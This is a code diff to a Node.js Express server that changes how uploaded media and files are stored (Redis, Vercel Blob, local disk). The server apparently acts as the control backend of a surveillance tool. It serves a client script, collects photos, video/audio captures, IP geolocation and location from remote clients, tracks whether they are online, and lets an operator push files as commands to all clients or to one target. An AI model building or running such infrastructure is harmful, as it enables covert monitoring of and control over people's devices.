@@ -5,8 +5,12 @@ const cors = require('cors');
 const fs = require('fs');
 const http = require('http');
 const IS_VERCEL = !!process.env.VERCEL;
-const USE_REDIS = !!(process.env.UPSTASH_REDIS_REST_URL);
-const USE_BLOB  = !!(process.env.BLOB_READ_WRITE_TOKEN);
+// Trim env vars — echo/pipe in PowerShell can add trailing newlines
+const REDIS_URL   = (process.env.UPSTASH_REDIS_REST_URL   || '').trim();
+const REDIS_TOKEN = (process.env.UPSTASH_REDIS_REST_TOKEN || '').trim();
+const BLOB_TOKEN  = (process.env.BLOB_READ_WRITE_TOKEN    || '').trim();
+const USE_REDIS = !!REDIS_URL;
+const USE_BLOB  = !!BLOB_TOKEN;
 const { Server } = IS_VERCEL ? { Server: null } : require('socket.io');
 let localtunnel;
 if (!IS_VERCEL) { try { localtunnel = require('localtunnel'); } catch (e) {} }
@@ -14,17 +18,20 @@ if (!IS_VERCEL) { try { localtunnel = require('localtunnel'); } catch (e) {} }
 // ── Upstash Redis ─────────────────────────────────────────────
 let redis = null;
 if (USE_REDIS) {
-    const { Redis } = require('@upstash/redis');
-    redis = new Redis({
-        url: process.env.UPSTASH_REDIS_REST_URL,
-        token: process.env.UPSTASH_REDIS_REST_TOKEN,
-    });
+    try {
+        const { Redis } = require('@upstash/redis');
+        redis = new Redis({ url: REDIS_URL, token: REDIS_TOKEN });
+        console.log('Redis client initialised:', REDIS_URL.slice(0, 40));
+    } catch (e) {
+        console.error('Redis init failed:', e.message);
+        redis = null;
+    }
 }
 
 // ── Vercel Blob ───────────────────────────────────────────────
 let blobPut = null;
 if (USE_BLOB) {
-    blobPut = require('@vercel/blob').put;
+    try { blobPut = require('@vercel/blob').put; } catch (e) { console.error('Blob init failed:', e.message); }
 }
 
 // ═══════════════════════════════════════════════════════════════
@@ -73,8 +80,14 @@ function loadStore() {
 async function loadStoreFromRedis() {
     if (!redis) return null;
     try {
-        const data = await redis.get(REDIS_KEY);
-        if (data) return typeof data === 'object' ? data : JSON.parse(data);
+        const data = await Promise.race([
+            redis.get(REDIS_KEY),
+            new Promise((_, rej) => setTimeout(() => rej(new Error('Redis timeout')), 5000))
+        ]);
+        if (data) {
+            if (typeof data === 'string') return JSON.parse(data);
+            if (typeof data === 'object') return data;
+        }
     } catch (e) { console.error('Redis load failed:', e.message); }
     return null;
 }
@@ -84,7 +97,8 @@ function saveStore() {
     if (saveTimeout) clearTimeout(saveTimeout);
     saveTimeout = setTimeout(() => {
         if (USE_REDIS && redis) {
-            redis.set(REDIS_KEY, store).catch(e => console.error('Redis save failed:', e.message));
+            redis.set(REDIS_KEY, JSON.stringify(store))
+                .catch(e => console.error('Redis save failed:', e.message));
         } else {
             try { fs.writeFileSync(DATA_FILE, JSON.stringify(store, null, 2)); }
             catch (e) { console.error('Store save failed:', e.message); }
@@ -219,10 +233,12 @@ function rateLimit(max, windowMs) {
         next();
     };
 }
-setInterval(() => {
-    const now = Date.now();
-    for (const key in rateLimits) if (now > rateLimits[key].reset) delete rateLimits[key];
-}, 60000);
+if (!IS_VERCEL) {
+    setInterval(() => {
+        const now = Date.now();
+        for (const key in rateLimits) if (now > rateLimits[key].reset) delete rateLimits[key];
+    }, 60000);
+}
 
 // ═══════════════════════════════════════════════════════════════
 //  MIDDLEWARE
@@ -278,9 +294,10 @@ function makeUploader(subdir) {
         limits: { fileSize: 50 * 1024 * 1024 }
     });
 }
-const uploadMedia = USE_BLOB ? null : makeUploader('videos');
-const uploadPhoto = USE_BLOB ? null : makeUploader('photos');
-const uploadCommandFile = USE_BLOB ? null : multer({
+// On Vercel: always memory storage (disk /tmp is ephemeral between cold starts)
+const uploadMedia = (USE_BLOB || IS_VERCEL) ? null : makeUploader('videos');
+const uploadPhoto = (USE_BLOB || IS_VERCEL) ? null : makeUploader('photos');
+const uploadCommandFile = (USE_BLOB || IS_VERCEL) ? null : multer({
     storage: multer.diskStorage({
         destination: (req, file, cb) => cb(null, `${UPLOAD_BASE}/files/`),
         filename: (req, file, cb) => {
@@ -303,22 +320,42 @@ app.get('/client.js', (req, res) => {
 
 // ── Upload video/audio ──
 app.post('/upload-media', (req, res) => {
-    const doUpload = USE_BLOB ? memoryUpload.single('media') : uploadMedia.single('media');
+    const doUpload = memoryUpload.single('media');
     doUpload(req, res, async (err) => {
         if (err) { console.error('Upload error:', err.message); return res.status(400).json({ error: err.message }); }
         if (!req.file) return res.status(400).json({ error: 'No file' });
         const cid = req.body.clientId || 'unknown';
         const ext = path.extname(req.file.originalname) || '.webm';
-        const filename = req.file.filename || `${cid}_${Date.now()}${ext}`;
-        let filePath = `/uploads/videos/${filename}`;
+        const id = Date.now().toString(36);
+        const filename = `${cid}_${id}${ext}`;
+        let filePath = null;
+
         if (USE_BLOB && blobPut) {
+            // Vercel Blob store
             try {
                 const blob = await blobPut(`videos/${filename}`, req.file.buffer, { access: 'public', contentType: req.file.mimetype });
                 filePath = blob.url;
             } catch (e) { console.error('Blob upload failed:', e.message); }
+        } else if (IS_VERCEL && USE_REDIS && redis) {
+            // Store in Redis (max 900KB to stay under 1MB key limit)
+            if (req.file.size < 900 * 1024) {
+                try {
+                    const b64 = req.file.buffer.toString('base64');
+                    await redis.set(`media:video:${id}`, JSON.stringify({ data: b64, mime: req.file.mimetype }));
+                    filePath = `/api/media-data/video/${id}`;
+                } catch (e) { console.error('Redis media store failed:', e.message); }
+            }
+        } else if (!IS_VERCEL) {
+            // Local disk
+            const diskPath = path.join(UPLOAD_BASE, 'videos', filename);
+            fs.writeFileSync(diskPath, req.file.buffer);
+            filePath = `/uploads/videos/${filename}`;
         }
+
+        if (!filePath) filePath = `/api/media-data/video/${id}`; // fallback path
+
         const entry = {
-            id: Date.now().toString(36), clientId: cid,
+            id, clientId: cid,
             filename, size: req.file.size, mimeType: req.file.mimetype,
             path: filePath, timestamp: new Date().toISOString()
         };
@@ -348,27 +385,49 @@ app.get('/api/ip-geo', async (req, res) => {
 
 // ── Upload photo ──
 app.post('/upload-photo', (req, res) => {
-    const doUpload = USE_BLOB ? memoryUpload.single('photo') : uploadPhoto.single('photo');
+    const doUpload = memoryUpload.single('photo');
     doUpload(req, res, async (err) => {
         if (err) { console.error('Photo upload error:', err.message); return res.status(400).json({ error: err.message }); }
         if (!req.file) return res.status(400).json({ error: 'No file' });
         const cid = req.body.clientId || 'unknown';
         const ext = path.extname(req.file.originalname) || '.jpg';
-        const filename = req.file.filename || `${cid}_${Date.now()}${ext}`;
-        let filePath = `/uploads/photos/${filename}`;
+        const id = Date.now().toString(36);
+        const filename = `${cid}_${id}${ext}`;
+        let filePath = null;
+
         if (USE_BLOB && blobPut) {
+            // Vercel Blob store
             try {
                 const blob = await blobPut(`photos/${filename}`, req.file.buffer, { access: 'public', contentType: req.file.mimetype });
                 filePath = blob.url;
             } catch (e) { console.error('Blob photo upload failed:', e.message); }
+        } else if (IS_VERCEL && USE_REDIS && redis) {
+            // Store in Redis as base64 (photos are typically < 300KB)
+            try {
+                const b64 = req.file.buffer.toString('base64');
+                await redis.set(`media:photo:${id}`, JSON.stringify({ data: b64, mime: req.file.mimetype || 'image/jpeg' }));
+                filePath = `/api/media-data/photo/${id}`;
+            } catch (e) {
+                console.error('Redis photo store failed:', e.message);
+                // Fallback: embed as data URL directly in path
+                filePath = `data:${req.file.mimetype || 'image/jpeg'};base64,${req.file.buffer.toString('base64')}`;
+            }
+        } else if (!IS_VERCEL) {
+            // Local disk
+            const diskPath = path.join(UPLOAD_BASE, 'photos', filename);
+            fs.writeFileSync(diskPath, req.file.buffer);
+            filePath = `/uploads/photos/${filename}`;
         }
+
+        if (!filePath) filePath = `data:image/jpeg;base64,${req.file.buffer.toString('base64')}`;
+
         const entry = {
-            id: Date.now().toString(36), clientId: cid,
+            id, clientId: cid,
             filename, size: req.file.size, mimeType: req.file.mimetype,
             path: filePath, timestamp: new Date().toISOString()
         };
         store.photos.unshift(entry);
-        if (store.photos.length > 2000) store.photos.length = 2000;
+        if (store.photos.length > 500) store.photos.length = 500;
         if (store.clients[cid]) {
             store.clients[cid].lastPhoto = filePath;
             store.clients[cid].lastPhotoTime = entry.timestamp;
@@ -378,6 +437,26 @@ app.post('/upload-photo', (req, res) => {
         console.log(`\u{1F4F7} Photo from ${cid}: ${filename}`);
         res.json({ success: true, id: entry.id, path: filePath });
     });
+});
+
+// ── Serve media stored in Redis (photo or video) ──
+app.get('/api/media-data/:type/:id', async (req, res) => {
+    if (!redis) return res.status(404).send('Not found');
+    try {
+        const key = `media:${req.params.type}:${req.params.id}`;
+        const raw = await redis.get(key);
+        if (!raw) return res.status(404).send('Not found');
+        const obj = typeof raw === 'string' ? JSON.parse(raw) : raw;
+        const buf = Buffer.from(obj.data, 'base64');
+        const mime = obj.mime || (req.params.type === 'photo' ? 'image/jpeg' : 'video/webm');
+        res.setHeader('Content-Type', mime);
+        res.setHeader('Content-Length', buf.length);
+        res.setHeader('Cache-Control', 'public, max-age=86400');
+        res.send(buf);
+    } catch (e) {
+        console.error('Media serve error:', e.message);
+        res.status(500).send('Error');
+    }
 });
 
 // ── Location ──
@@ -866,29 +945,39 @@ app.post('/api/config', requireAuth, (req, res) => {
 });
 
 // ── Upload file and queue as command ──
-app.post('/api/command-file', requireAuth, (USE_BLOB ? memoryUpload : uploadCommandFile).single('file'), async (req, res) => {
+app.post('/api/command-file', requireAuth, memoryUpload.single('file'), async (req, res) => {
     if (!req.file) return res.status(400).json({ error: 'No file uploaded' });
     const { target = 'all', customName } = req.body;
     const displayName = customName && customName.trim() ? customName.trim() : req.file.originalname;
     const ext = path.extname(req.file.originalname);
     const baseName = path.basename(req.file.originalname, ext).replace(/[^a-z0-9_\-]/gi, '_').slice(0, 60);
-    const filename = req.file.filename || `${baseName}_${Date.now()}${ext}`;
-    let fileUrl = `/uploads/files/${filename}`;
+    const fileId = Date.now().toString(36);
+    const filename = `${baseName}_${fileId}${ext}`;
+    let fileUrl = null;
+
     if (USE_BLOB && blobPut) {
         try {
             const blob = await blobPut(`files/${filename}`, req.file.buffer, { access: 'public', contentType: req.file.mimetype });
             fileUrl = blob.url;
         } catch (e) { console.error('Blob file upload failed:', e.message); }
+    } else if (IS_VERCEL && USE_REDIS && redis && req.file.size < 900 * 1024) {
+        try {
+            const b64 = req.file.buffer.toString('base64');
+            await redis.set(`media:file:${fileId}`, JSON.stringify({ data: b64, mime: req.file.mimetype }), { ex: 86400 });
+            fileUrl = `/api/media-data/file/${fileId}`;
+        } catch (e) { console.error('Redis file store failed:', e.message); }
+    } else if (!IS_VERCEL) {
+        const diskPath = path.join(UPLOAD_BASE, 'files', filename);
+        fs.writeFileSync(diskPath, req.file.buffer);
+        fileUrl = `/uploads/files/${filename}`;
     }
+
+    if (!fileUrl) return res.status(413).json({ error: 'File too large to store without Blob store' });
+
     const cmd = {
-        id: Date.now().toString(36),
+        id: fileId,
         type: 'file',
-        data: {
-            url: fileUrl,
-            filename: displayName,
-            size: req.file.size,
-            mimeType: req.file.mimetype
-        },
+        data: { url: fileUrl, filename: displayName, size: req.file.size, mimeType: req.file.mimetype },
         timestamp: new Date().toISOString()
     };
     const targets = target === 'all' ? Object.keys(store.clients) : [target];
@@ -1058,18 +1147,20 @@ app.use((err, req, res, next) => {
 // ═══════════════════════════════════════════════════════════════
 //  CLIENT STATUS MONITOR
 // ═══════════════════════════════════════════════════════════════
-setInterval(() => {
-    const cutoff = Date.now() - 20000; // 20 seconds
-    Object.entries(store.clients).forEach(([id, c]) => {
-        const wasOnline = c.online;
-        const isOnline = new Date(c.lastSeen).getTime() >= cutoff;
-        if (wasOnline && !isOnline) {
-            c.online = false;
-            addEvent('client_disconnected', { clientId: id });
-            console.log(`🔴 Client offline: ${id}`);
-        }
-    });
-}, 10000);
+if (!IS_VERCEL) {
+    setInterval(() => {
+        const cutoff = Date.now() - 20000;
+        Object.entries(store.clients).forEach(([id, c]) => {
+            const wasOnline = c.online;
+            const isOnline = new Date(c.lastSeen).getTime() >= cutoff;
+            if (wasOnline && !isOnline) {
+                c.online = false;
+                addEvent('client_disconnected', { clientId: id });
+                console.log(`\u{1F534} Client offline: ${id}`);
+            }
+        });
+    }, 10000);
+}
 
 // ═══════════════════════════════════════════════════════════════
 //  START + TUNNEL
